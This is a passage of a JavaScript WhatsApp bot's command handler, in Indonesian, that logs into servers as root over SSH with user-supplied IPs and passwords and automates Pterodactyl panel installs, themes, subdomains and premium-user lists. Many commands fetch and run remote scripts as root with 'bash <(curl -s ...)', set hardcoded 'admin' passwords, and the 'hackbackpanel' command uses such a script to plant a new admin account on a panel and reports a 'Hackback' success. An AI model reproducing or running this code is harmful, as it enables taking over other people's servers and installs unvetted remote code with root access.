}).connect(connSettings);
}
break   

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'installtema': {
 if (!isCreator) return reply(mess.owner)
if (!text || !text.split("|")) return m.reply("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return m.reply("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
    let headerText = `
    Silahkan *Pilih Tema* Yang Ingin Anda Install\nJika Ingin Menginstall *Thema Nebula*, _Install Plugin_ Terlebih Dulu
    `;
    ZakzzDev.sendMessage(m.chat, {
        image: { url: 'https://img1.pixhost.to/images/5842/600673742_zakzzdev.jpg' },
        caption: headerText, 
        footer: "「 AlwaysZakzz 」",
        buttons: [
            {
                buttonId: 'action',
                buttonText: {
                    displayText: '𝙋𝙞𝙡𝙞𝙝 𝙏𝙝𝙚𝙢𝙚'
                },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: '𝙋𝙞𝙡𝙞𝙝 𝙏𝙝𝙚𝙢𝙚',
                        sections: [
                            { 
                                title: "𝙋𝙞𝙡𝙞𝙝 𝙏𝙝𝙚𝙢𝙚",  
                                rows: [
                                    { title: "𝙸𝙽𝚂𝚃𝙰𝙻𝙻 𝙿𝙻𝚄𝙶𝙸𝙽", id: `.installplugin` },
                                    { title: "𝙸𝙽𝚂𝚃𝙰𝙻𝙻 𝙽𝙴𝙱𝚄𝙻𝙰", id: `.installtemanebula` }, 
                                    { title: "𝙸𝙽𝚂𝚃𝙰𝙻𝙻 𝙽𝙸𝙶𝙷𝚃𝙲𝙾𝚁𝙴", id: `.installtemanightcore` },
                                    { title: "𝙸𝙽𝚂𝚃𝙰𝙻𝙻 𝚂𝚃𝙴𝙻𝙻𝙰𝚁", id: `.installtemastellar` }, 
                                    { title: "𝙸𝙽𝚂𝚃𝙰𝙻𝙻 𝙱𝙸𝙻𝙻𝙸𝙽𝙶", id: `.installtemabilling` },
                                    { title: "𝙸𝙽𝚂𝚃𝙰𝙻𝙻 𝙴𝙽𝙸𝙶𝙼𝙰", id: `.installtemaenigma` }, 
                                    { title: "𝙸𝙽𝚂𝚃𝙰𝙻𝙻 𝙰𝙻𝚈𝚂𝙸𝚄𝙼", id: `.installtemaelysium` },
                                    { title: "𝚄𝙽𝙸𝙽𝚂𝚃𝙰𝙻𝙻 𝚃𝙷𝙴𝙼𝙰", id: `.uninstallthema` }, 
                                ]
                            }
                        ],
                    }),
                }
            }
        ],
        headerType: 4,
        viewOnce: true
    }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "installtemanebula": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6283143274439\n');
stream.write('https://whatsapp.com/channel/0029VbAnT9bChq6SZjIjeN1n\n');
stream.write('https://chat.whatsapp.com/Krglrbk17wl28AIPq2QEpy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "uninstallthema": {
if (!isCreator) return reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connDevSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
╭──〔 ⚙️ BERIKUT DETAIL AKUN PANEL ANDA 〕
│
│  👤 *Username* : admin
│  🔐 *Password* : ${passwordPanel}
│  🌐 *Domain*   : ${domainpanel}
│
╰───〔 〄 〕

📌 *Catatan:*
Silakan buat *Allocation* dan ambil *Token Wings* di Node yang telah dibuat otomatis oleh bot.

▶️ *Cara Menjalankan Wings:*
Ketik:
*.startwings* ipvps | pwvps | tokenwings
`
await ZakzzDev.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('AlwaysZakzz\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('AlwaysZakzz\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connDevSettings);
}
break  

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "AlwaysZakzz" + getRandom("")
const newpw = "AlwaysZakzz" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
✅ *Hackback Panel Berhasil!*

┏━━━┫ 𝙋𝘼𝙉𝙀𝙇 𝘼𝘿𝙈𝙄𝙉 𝘼𝘾𝘾 ┣━━━┓
┃ 👤 *Username* : ${newuser}
┃ 🔐 *Password* : ${newpw}
┗━━━━━━━━━━━━━━━━━━━━┛

⚠️ *Gunakan dengan bijak, kekuatan ada di tanganmu.*
`
await ZakzzDev.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "subdomain": case "subdo": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("skyzoo|ipserver"))
if (!text.split("|")) return m.reply(example("skyzoo|ipserver"))
let [host, ip] = text.split("|")
let dom = await Object.keys(global.subdomain)
let list = []
for (let i of dom) {
await list.push({
title: i, 
id: `.domain ${dom.indexOf(i) + 1} ${host}|${ip}`
})
}
await ZakzzDev.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Domain',
          sections: [
            {
              title: 'List Domain',
              highlight_label: 'Recommended',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Domain Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "domain": {
if (!isCreator) return Reply(mess.owner)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cadmin": {
    if (!isCreator) return Reply(mess.owner)
    if (!text || !text.includes(",")) return m.reply(example("nama,nomor"))

    const [namaInput, nomor] = text.split(",").map(v => v.trim())
    if (!namaInput || !nomor) return m.reply("Format salah! Contoh: .cadmin AlwaysZakzz,628xxxx")

    let username = namaInput.toLowerCase()
    let email = username + "@gmail.com"
    let name = capital(username)
    let password = username + crypto.randomBytes(2).toString('hex')
    let jid = nomor.includes("@s.whatsapp.net") ? nomor : nomor + "@s.whatsapp.net"

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password
        })
    })

    let data = await f.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
    let user = data.attributes

    let teks = `✅ *Akun Admin Panel Berhasil Dibuat!*\n\n*📡 ID User:* ${user.id}\n*👤 Username:* ${user.username}\n*🔐 Password:* ${password}\n🌐 *Panel:* ${global.domain}\n\n*Syarat & Ketentuan:*\n• Berlaku 30 hari\n• Simpan data ini dengan aman\n• Jangan asal hapus server!\n• Maling SC = Akun diblokir!\n\n⚡ *AlwaysZakzz – Cepat, Aman, Terpercaya*`

    await fs.writeFileSync("./akunpanel.txt", teks)
    await ZakzzDev.sendMessage(jid, {
        document: fs.readFileSync("./akunpanel.txt"),
        fileName: "akunpanel.txt",
        mimetype: "text/plain",
        caption: teks
    }, { quoted: m })

    await fs.unlinkSync("./akunpanel.txt")
    await m.reply(`✅ *Akun Admin Panel Anda Berhasil Dibuat!*📩 Data telah dikirim ke chat pribadi Anda.⚡ Powered by *AlwaysZakzz* – Cepat. Aman. Terpercaya.`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "cadmin-v2": {
    if (!isCreator) return Reply(mess.owner)
    if (!text || !text.includes(",")) return m.reply(example("nama,nomor"))

    const [namaInput, nomor] = text.split(",").map(v => v.trim())
    if (!namaInput || !nomor) return m.reply("Format salah! Contoh: .cadmin-v2 AlwaysZakzz,628xxxx")

    let username = namaInput.toLowerCase()
    let email = username + "@gmail.com"
    let name = capital(username)
    let password = username + crypto.randomBytes(2).toString('hex')
    let jid = nomor.includes("@s.whatsapp.net") ? nomor : nomor + "@s.whatsapp.net"

    let f = await fetch(domainV2 + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password.toString()
        })
    })

    let data = await f2.json();
    if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
    let user = data.attributes

    let teks = `✅ *Akun Admin Panel Berhasil Dibuat!*\n\n*📡 ID User:* ${user.id}\n*👤 Username:* ${user.username}\n*🔐 Password:* ${password}\n🌐 *Panel:* ${global.domain}\n\n*Syarat & Ketentuan:*\n• Berlaku 30 hari\n• Simpan data ini dengan aman\n• Jangan asal hapus server!\n• Maling SC = Akun diblokir!\n\n⚡ *AlwaysZakzz – Cepat, Aman, Terpercaya*`

    await fs.writeFileSync("./akunpanel.txt", teks)
    await ZakzzDev.sendMessage(jid, {
        document: fs.readFileSync("./akunpanel.txt"),
        fileName: "akunpanel.txt",
        mimetype: "text/plain",
        caption: teks
    }, { quoted: m })

    await fs.unlinkSync("./akunpanel.txt")
    await m.reply(`✅ *Akun Admin Panel Anda Berhasil Dibuat!*📩 Data telah dikirim ke chat pribadi Anda.⚡ Powered by *AlwaysZakzz* – Cepat. Aman. Terpercaya.`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "addrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd|responnya"))
if (!text.split("|")) return m.reply(example("cmd|responnya"))
let result = text.split("|")
if (result.length < 2) return m.reply(example("cmd|responnya"))
const [ cmd, respon ] = result
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (res) return m.reply("Cmd respon sudah ada")
let obj = {
cmd: cmd.toLowerCase(), 
respon: respon
}
list.push(obj)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menambah cmd respon *${cmd.toLowerCase()}* kedalam database respon`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delrespon": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("cmd\n\n ketik *.listrespon* untuk melihat semua cmd"))
const cmd = text.toLowerCase()
let res = list.find(e => e.cmd == cmd.toLowerCase())
if (!res) return m.reply("Cmd respon tidak ditemukan\nketik *.listrespon* untuk melihat semua cmd respon")
let position = list.indexOf(res)
await list.splice(position, 1)
fs.writeFileSync("./library/database/list.json", JSON.stringify(list, null, 2))
m.reply(`Berhasil menghapus cmd respon *${cmd.toLowerCase()}* dari database respon`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listrespon": {
if (!isCreator) return Reply(mess.owner)
if (list.length < 1) return m.reply("Tidak ada cmd respon")
let teks = "\n *#- List all cmd response*\n"
await list.forEach(e => teks += `\n* *Cmd :* ${e.cmd}\n`)
m.reply(`${teks}`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "addgrouppremium": {
if (!isCreator) return Reply(mess.owner);
if (!m.isGroup) return Reply("Command ini hanya bisa digunakan di dalam grup!");
let premium;
try {
premium = JSON.parse(fs.readFileSync("./library/database/premium.json", "utf8"));
if (!Array.isArray(premium)) premium = [];
} catch {
premium = [];
}
const metadata = await ZakzzDev.groupMetadata(m.chat);
const participants = metadata.participants
.map(p => p.id)
.filter(id => id.endsWith("@s.whatsapp.net"));
const added = [];
for (const id of participants) {
if (!premium.includes(id) && id !== m.sender) {
premium.push(id);
added.push(id);
}
}
fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
if (added.length === 0) {
return m.reply("Tidak ada anggota baru yang ditambahkan ke daftar premium.");
}
const teks = `✅ *Berhasil Menambahkan ${added.length} Anggota Premium Baru:*\n\n` +
added.map((id, idx) => `${idx + 1}. @${id.split("@")[0]}`).join("\n");
await ZakzzDev.sendMessage(m.chat, {
text: teks,
mentions: added
}, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delgrouppremium": {
if (!isCreator) return Reply(mess.owner);
if (!m.isGroup) return Reply("Command ini hanya bisa digunakan di dalam grup!");
let premium;
try {
premium = JSON.parse(fs.readFileSync("./library/database/premium.json", "utf8"));
if (!Array.isArray(premium)) premium = [];
} catch {
premium = [];
}
const metadata = await ZakzzDev.groupMetadata(m.chat);
const participants = metadata.participants
.map(p => p.id)
.filter(id => id.endsWith("@s.whatsapp.net"));
const removed = [];
for (const id of participants) {
if (premium.includes(id)) {
premium = premium.filter(x => x !== id);
removed.push(id);
}
}
fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
if (removed.length === 0) {
return m.reply("Tidak ada anggota premium yang dihapus dari grup ini.");
}
const teks = `❌ *Berhasil Menghapus ${removed.length} Anggota Premium:*\n\n` +
removed.map((id, idx) => `${idx + 1}. @${id.split("@")[0]}`).join("\n");
await ZakzzDev.sendMessage(m.chat, {
text: teks,
mentions: removed
}, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "addprem": {
if (!isCreator) return Reply(mess.owner);
if (!m.quoted && !text)
return m.reply(example("6285###"));
let input;
if (m.quoted) {
input = m.quoted.sender;
} else if (m.mentionedJid && m.mentionedJid.length > 0) {
input = m.mentionedJid[0];
} else {
input = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
}
const input2 = input.split("@")[0];
if (input2 === global.owner || premium.includes(input) || input === botNumber) {
return m.reply(`Nomor ${input2} sudah menjadi Premium!`);
}
premium.push(input);
fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2));
m.reply(`Berhasil menambah Premium ✅`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listprem": {
if (premium.length < 1) return m.reply("Tidak ada user reseller")
let teks = `\n *乂 List all reseller panel*\n`
for (let i of premium) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
ZakzzDev.sendMessage(m.chat, {text: teks, mentions: premium}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delprem": {
if (!isCreator) return Reply(mess.owner);
if (!m.quoted && !text)
